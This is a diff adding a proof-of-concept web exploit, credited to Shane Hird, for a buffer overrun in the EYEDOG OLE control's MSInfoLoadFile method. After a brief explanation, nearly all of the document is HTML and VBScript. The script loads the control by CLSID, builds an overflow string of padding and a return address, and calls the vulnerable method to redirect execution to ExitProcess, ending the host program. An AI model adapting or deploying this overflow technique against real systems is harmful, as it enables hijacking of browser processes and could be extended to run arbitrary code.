@@ -1,0 +1,30 @@
+EYEDOG:
+
+With this control, MSInfoLoadFile is the offending method. 
+There is no easy way to RET to our code, so instead, I have 
+shown how to simply RET to ExitProcess directly. This will 
+cause the host to terminate.
+
+<object classid="clsid:06A7EC63-4E21-11D0-A112-00A0C90543AA"
+id="eye"></object>
+
+<script language="vbscript"><!--
+
+msgbox("EYEDOG OLE Control module Buffer Overrun (Local 
+Version)" + Chr(10) + "Written by Shane Hird")
+
+'Padding for the exploit
+expstr 
+= "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAA"
+
+'RET address (ExitProcess, BFF8D4CA)
+expstr = expstr + Chr(202) + Chr(212) + Chr(248) + Chr(191)
+
+'Call exploitable method (MSInfoLoadFile)
+eye.MSInfoLoadFile(expstr)
+
+--></script>
